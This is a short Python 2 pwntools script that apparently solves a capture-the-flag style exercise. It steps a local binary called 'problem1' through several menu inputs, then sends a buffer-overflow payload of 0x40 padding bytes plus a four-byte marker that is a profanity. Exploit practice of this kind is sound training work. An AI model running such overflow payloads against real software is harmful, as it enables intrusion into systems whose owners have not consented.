from pwn  import *
import os
import sys

p = process("./problem1")

print p.recv()

p.sendline("1")
print p.recv()
sleep(0.5)

p.sendline("a")
sleep(0.5)

p.sendline("a")
print p.recv()
sleep(0.5)

p.sendline("3")
print p.recv()
sleep(0.5)

p.sendline("4")
print p.recv()
sleep(0.5)

payload = "a"*0x40
payload += "fuck"

p.sendline(payload)
print p.recv()
sleep(0.5)

p.sendline("5")
print p.recv()
sleep(0.5)
